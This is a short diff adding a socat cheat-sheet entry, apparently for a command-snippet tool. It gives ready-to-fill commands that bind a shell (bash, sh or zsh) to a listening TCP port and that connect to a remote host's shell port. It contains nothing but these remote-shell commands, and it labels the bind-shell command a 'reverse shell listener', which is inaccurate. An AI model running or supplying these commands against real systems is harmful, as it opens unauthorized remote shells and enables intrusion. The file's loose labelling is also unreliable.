@@ -1,0 +1,10 @@
+% socat
+
+# Reverse shell listener
+socat -d -d TCP4-LISTEN:<PORT>,fork,reuseaddr EXEC:/bin/<SHELL>
+
+# Connect to reverse shell
+socat -d -d - TCP4:<REMOTE_IP_HOST>:<PORT>
+
+$ PORT: echo {0..65535} | tr ' ' '\n'
+$ SHELL: echo 'bash sh zsh' | tr ' ' '\n'
